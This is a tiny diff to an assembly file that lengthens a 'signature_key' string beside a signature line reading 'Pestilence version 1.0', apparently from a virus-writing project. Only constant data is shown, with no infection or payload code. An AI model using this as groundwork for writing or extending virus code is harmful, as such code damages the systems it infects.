@@ -25,6 +25,6 @@ key: db "1231231231"
 signature: db "Pestilence version 1.0 (c)oded by <mtaquet>-<matheme>"
 signature_end:
     db " ["
-signature_key: db "123456781234567812345678"
+signature_key: db "12345678123456781234567812345678"
     db "]"
 _end:
